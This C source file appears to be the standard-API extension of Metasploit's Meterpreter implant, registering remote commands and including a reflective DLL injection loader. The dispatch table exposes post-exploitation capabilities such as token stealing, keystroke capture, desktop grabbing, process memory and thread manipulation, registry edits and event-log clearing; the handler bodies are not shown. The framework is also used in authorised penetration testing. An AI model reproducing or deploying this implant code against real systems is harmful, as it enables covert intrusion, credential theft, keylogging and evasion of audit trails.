/*
 * This module provides access to the standard API of the machine in some
 * regards
 */
#include "precomp.h"

// include the Reflectiveloader() function, we end up linking back to the metsrv.dll's Init function
// but this doesnt matter as we wont ever call DLL_METASPLOIT_ATTACH as that is only used by the 
// second stage reflective dll inject payload and not the metsrv itself when it loads extensions.
#ifdef _WIN32
 #include "../../../ReflectiveDLLInjection/ReflectiveLoader.c"
#endif
// NOTE: _CRT_SECURE_NO_WARNINGS has been added to Configuration->C/C++->Preprocessor->Preprocessor

// this sets the delay load hook function, see DelayLoadMetSrv.h
EnableDelayLoadMetSrv();

// General
extern DWORD request_general_channel_open(Remote *remote, Packet *packet);

Command customCommands[] =
{
	// General
	{ "core_channel_open",
	  { request_general_channel_open,                      { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},

	// Fs
	{ "stdapi_fs_ls",
	  { request_fs_ls,                                     { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_fs_getwd",
	  { request_fs_getwd,                                  { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_fs_chdir",
	  { request_fs_chdir,                                  { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_fs_mkdir",
	  { request_fs_mkdir,                                  { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_fs_delete_dir",
	  { request_fs_delete_dir,                             { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_fs_delete_file",
	  { request_fs_delete_file,                             { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_fs_stat",
	  { request_fs_stat,                                   { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_fs_file_expand_path",
	  { request_fs_file_expand_path,                       { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},

	// Process
	{ "stdapi_sys_process_attach",
	  { request_sys_process_attach,                        { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_sys_process_close",
	  { request_sys_process_close,                         { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_sys_process_execute",
	  { request_sys_process_execute,                       { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_sys_process_kill",
	  { request_sys_process_kill,                          { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_sys_process_get_processes",
	  { request_sys_process_get_processes,                 { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_sys_process_getpid",
	  { request_sys_process_getpid,                        { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_sys_process_get_info",
	  { request_sys_process_get_info,                      { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_sys_process_wait",
	  { request_sys_process_wait,                          { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},

		// Image
	{ "stdapi_sys_process_image_load",
	  { request_sys_process_image_load,                    { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_sys_process_image_get_proc_address",
	  { request_sys_process_image_get_proc_address,        { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_sys_process_image_unload",
	  { request_sys_process_image_unload,                  { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_sys_process_image_get_images",
	  { request_sys_process_image_get_images,              { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},

		// Memory
	{ "stdapi_sys_process_memory_allocate",
	  { request_sys_process_memory_allocate,               { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_sys_process_memory_free",
	  { request_sys_process_memory_free,                   { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_sys_process_memory_read",
	  { request_sys_process_memory_read,                   { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_sys_process_memory_write",
	  { request_sys_process_memory_write,                  { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_sys_process_memory_query",
	  { request_sys_process_memory_query,                  { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_sys_process_memory_protect",
	  { request_sys_process_memory_protect,                { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_sys_process_memory_lock",
	  { request_sys_process_memory_lock,                   { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_sys_process_memory_unlock",
	  { request_sys_process_memory_unlock,                 { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
		
		// Thread
	{ "stdapi_sys_process_thread_open",
	  { request_sys_process_thread_open,                   { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_sys_process_thread_create",
	  { request_sys_process_thread_create,                 { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_sys_process_thread_close",
	  { request_sys_process_thread_close,                  { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_sys_process_thread_get_threads",
	  { request_sys_process_thread_get_threads,            { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_sys_process_thread_suspend",
	  { request_sys_process_thread_suspend,                { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_sys_process_thread_resume",
	  { request_sys_process_thread_resume,                 { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_sys_process_thread_terminate",
	  { request_sys_process_thread_terminate,              { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_sys_process_thread_query_regs",
	  { request_sys_process_thread_query_regs,             { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_sys_process_thread_set_regs",
	  { request_sys_process_thread_set_regs,               { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},

	// Registry
	{ "stdapi_registry_open_key",
	  { request_registry_open_key,                         { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_registry_create_key",
	  { request_registry_create_key,                       { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_registry_enum_key",
	  { request_registry_enum_key,                         { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_registry_delete_key",
	  { request_registry_delete_key,                       { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_registry_close_key",
	  { request_registry_close_key,                        { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_registry_set_value",
	  { request_registry_set_value,                        { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_registry_query_value",
	  { request_registry_query_value,                      { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_registry_query_class",
	  { request_registry_query_class,                      { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_registry_enum_value",
	  { request_registry_enum_value,                       { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_registry_delete_value",
	  { request_registry_delete_value,                     { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},

	// Sys/config
	{ "stdapi_sys_config_getuid",
	  { request_sys_config_getuid,                         { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_sys_config_sysinfo",
	  { request_sys_config_sysinfo,                        { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_sys_config_rev2self",
	  { request_sys_config_rev2self,                       { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_sys_config_getprivs",
	  { request_sys_config_getprivs,                       { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_sys_config_steal_token",
	  { request_sys_config_steal_token,                    { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_sys_config_drop_token",
	  { request_sys_config_drop_token,                     { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	// Net
	{ "stdapi_net_config_get_routes",
	  { request_net_config_get_routes,                     { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_net_config_add_route",
	  { request_net_config_add_route,                      { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_net_config_remove_route",
	  { request_net_config_remove_route,                   { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_net_config_get_interfaces",
	  { request_net_config_get_interfaces,                 { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},

	// Socket
	{ "stdapi_net_socket_tcp_shutdown",
	  { request_net_socket_tcp_shutdown,                   { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},

	// UI
	{ "stdapi_ui_enable_mouse",
	  { request_ui_enable_mouse,                           { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_ui_enable_keyboard",
	  { request_ui_enable_keyboard,                        { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_ui_get_idle_time",
	  { request_ui_get_idle_time,                          { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_ui_grabdesktop",
	  { request_ui_grabdesktop,                          { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_ui_start_keyscan",
	  { request_ui_start_keyscan,                          { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_ui_stop_keyscan",
	  { request_ui_stop_keyscan,                          { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_ui_get_keys",
	  { request_ui_get_keys,                          { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},

	// Event Log
	{ "stdapi_sys_eventlog_open",
	  { request_sys_eventlog_open,                         { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_sys_eventlog_numrecords",
	  { request_sys_eventlog_numrecords,                   { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_sys_eventlog_read",
	  { request_sys_eventlog_read,                         { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_sys_eventlog_oldest",
	  { request_sys_eventlog_oldest,                       { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_sys_eventlog_clear",
	  { request_sys_eventlog_clear,                        { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "stdapi_sys_eventlog_close",
	  { request_sys_eventlog_close,                        { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},

	{ "stdapi_sys_power_exitwindows",
	  { request_sys_power_exitwindows,                     { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},

	// Terminator
	{ NULL,
	  { EMPTY_DISPATCH_HANDLER                      },
	  { EMPTY_DISPATCH_HANDLER                      },
	},
};

/*
 * Initialize the server extension
 */
#ifdef _WIN32
DWORD __declspec(dllexport) InitServerExtension(Remote *remote)
#else
DWORD InitServerExtension(Remote *remote)
#endif
{
	DWORD index;
#ifdef _WIN32
	hMetSrv = remote->hMetSrv;
#endif
	for (index = 0;
	     customCommands[index].method;
	     index++)
		command_register(&customCommands[index]);

	return ERROR_SUCCESS;
}

/*
 * Deinitialize the server extension
 */
#ifdef _WIN32
DWORD __declspec(dllexport) DeinitServerExtension(Remote *remote)
#else
DWORD DeinitServerExtension(Remote *remote)
#endif
{
	DWORD index;

	for (index = 0;
	     customCommands[index].method;
	     index++)
		command_deregister(&customCommands[index]);

	return ERROR_SUCCESS;
}

